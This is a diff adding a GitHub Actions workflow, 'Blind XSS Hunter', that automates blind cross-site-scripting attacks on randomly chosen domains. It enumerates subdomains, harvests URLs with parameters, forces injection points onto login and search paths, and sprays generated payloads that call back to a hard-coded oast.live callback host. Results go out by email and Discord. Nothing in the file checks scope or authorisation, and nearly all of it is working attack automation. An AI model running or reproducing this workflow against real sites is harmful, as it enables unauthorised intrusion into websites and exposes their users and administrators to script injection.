@@ -1,0 +1,183 @@
+name: "Blind XSS Hunter - High Yield"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_count:
+        description: 'Number of targets'
+        required: false
+        default: '2'
+      use_ai_triage:
+        description: 'Use AI to prioritize'
+        required: false
+        default: true
+        type: boolean
+
+jobs:
+  bxss-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
+      DISCORD_CHECK: ${{ secrets.DISCORD_WEBHOOK }}
+      GEMINI_CHECK: ${{ secrets.GEMINI_API_KEY }}
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        
+      - name: Setup Tools
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          pip install --quiet uro google-generativeai
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+          mkdir -p tmp results reports
+
+      - name: High-Yield URL Collection
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
+        run: |
+          set -euo pipefail
+          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
+          
+          # 1. Select Targets
+          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
+          
+          while IFS= read -r domain; do
+            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
+            echo "🎯 Target: $domain"
+            
+            # 2. Subdomain Discovery (Full run)
+            subfinder -d "$domain" -silent >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
+            
+            # 3. Mix Selection: Top 5 and Random 5 subdomains for better variety
+            (head -n 5 tmp/subs.txt; shuf -n 5 tmp/subs.txt 2>/dev/null || true) | sort -u > tmp/current_subs.txt
+            
+            while read -r sub; do
+               echo "  ∟ Crawling: $sub"
+               # Increased timeout to 90s for deeper results
+               (timeout 90s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
+               (timeout 90s gau "$sub" --threads 10 --blacklist jpg,png,gif,css,js,svg --subs 2>/dev/null || true) >> tmp/raw_urls.txt
+            done < tmp/current_subs.txt
+          done < tmp/active_targets.txt
+          
+          # 4. Smart Filtering & Parameter Forcing
+          if [[ -s tmp/raw_urls.txt ]]; then
+            # Try to find real parameters first
+            cat tmp/raw_urls.txt | grep "=" | uro --filters hasparams >> tmp/filtered.txt || true
+            
+            # If still empty, target high-value paths and force a parameter
+            if [[ ! -s tmp/filtered.txt ]]; then
+               echo "⚠️ No params found, forcing injection points on high-value paths..."
+               cat tmp/raw_urls.txt | grep -Ei "search|query|signup|login|contact|profile|settings|support|feedback" | \
+               sed 's/$/?debug=true/' | head -n 50 >> tmp/filtered.txt || true
+            fi
+          fi
+          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV
+
+      - name: AI Triage
+        if: github.event.inputs.use_ai_triage == true && env.GEMINI_CHECK != ''
+        shell: bash
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          if [[ -s tmp/filtered.txt ]]; then
+            python3 ai_triage.py tmp/filtered.txt tmp/ || true
+            touch tmp/high_priority.txt tmp/medium_priority.txt
+            cat tmp/high_priority.txt tmp/medium_priority.txt | head -n 100 > tmp/final_targets.txt || true
+          fi
+          # Fallback to top 50 filtered if AI triage results are empty
+          [[ ! -s tmp/final_targets.txt && -s tmp/filtered.txt ]] && head -n 50 tmp/filtered.txt > tmp/final_targets.txt || true
+          echo "AI_TRIAGE_USED=true" >> $GITHUB_ENV
+
+      - name: Manual Triage Fallback
+        if: (github.event.inputs.use_ai_triage == false || env.GEMINI_CHECK == '')
+        run: |
+          if [[ -s tmp/filtered.txt ]]; then
+             grep -Ei "id=|query=|search=|q=|msg=|name=|url=|redirect=|debug=|page=" tmp/filtered.txt > tmp/final_targets.txt || head -n 75 tmp/filtered.txt > tmp/final_targets.txt
+          fi
+          echo "AI_TRIAGE_USED=false" >> $GITHUB_ENV
+
+      - name: Live Host Verification
+        run: |
+          if [[ -s tmp/final_targets.txt ]]; then
+            # Use httpx to ensure we only send payloads to active web servers
+            cat tmp/final_targets.txt | httpx -silent -timeout 4 -threads 40 -no-color | cut -d' ' -f1 > tmp/live_urls.txt || true
+            [[ -s tmp/live_urls.txt ]] && mv tmp/live_urls.txt tmp/final_targets.txt || echo "No live URLs found"
+          fi
+          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV
+
+      - name: Injection Phase
+        shell: bash
+        env:
+          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
+        run: |
+          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt
+          
+          if [[ ! -s tmp/final_targets.txt ]]; then
+            echo "❌ No valid targets found. Scan ending."
+            echo "INJECTIONS_SUCCESS=0" >> $GITHUB_ENV
+            echo "PAYLOAD_COUNT=0" >> $GITHUB_ENV
+            exit 0
+          fi
+
+          mapfile -t PAYLOADS < tmp/payloads.txt
+          success_count=0
+          
+          for i in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$i]}"
+            echo "💉 Injecting Variant $((i+1))/${#PAYLOADS[@]}"
+            
+            # Robust injection logic
+            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 15 curl -sk -L -m 7 -w "%{http_code}\n" -o /dev/null "{}" | grep -cE "^(200|302|403|404)" || echo 0)
+            success_count=$((success_count + count))
+            sleep 1
+          done
+          
+          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV
+          echo "PAYLOAD_COUNT=${#PAYLOADS[@]}" >> $GITHUB_ENV
+
+      - name: Generate Summary Report
+        if: always()
+        run: |
+          cat > reports/scan_summary.md << EOF
+          # 🎯 Blind XSS Scan Summary
+          **Status:** Finished
+          **Target Samples:** $(wc -l < tmp/active_targets.txt || echo 0)
+          
+          | Metric | Value |
+          |--------|-------|
+          | Parameterized URLs | $URL_FILTERED |
+          | Verified Live URLs | $URLS_SELECTED |
+          | Total Injections | $INJECTIONS_SUCCESS |
+          | AI Triage Status | $AI_TRIAGE_USED |
+          
+          📡 **OAST Endpoint:** \`${{ secrets.OAST_URL || 'd51hku...oast.live' }}\`
+          EOF
+
+      - name: Send Email Report
+        if: always() && env.MAIL_CHECK != ''
+        uses: dawidd6/action-send-mail@v3
+        with:
+          server_address: smtp.gmail.com
+          server_port: 465
+          secure: true
+          username: ${{ secrets.EMAIL_USERNAME }}
+          password: ${{ secrets.EMAIL_PASSWORD }}
+          subject: "✅ BXSS Scan Complete - $URLS_SELECTED Targets"
+          to: ${{ secrets.EMAIL_USERNAME }}
+          from: "BXSS Hunter"
+          body: file://reports/scan_summary.md
+          convert_markdown: true
+
+      - name: Discord Notification
+        if: always() && env.DISCORD_CHECK != ''
+        shell: bash
+        run: |
+          curl -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" \
+          -d "{\"content\": \"🚀 **BXSS Scan Complete.** $INJECTIONS_SUCCESS injections sent to $URLS_SELECTED URLs across your targets.\"}"
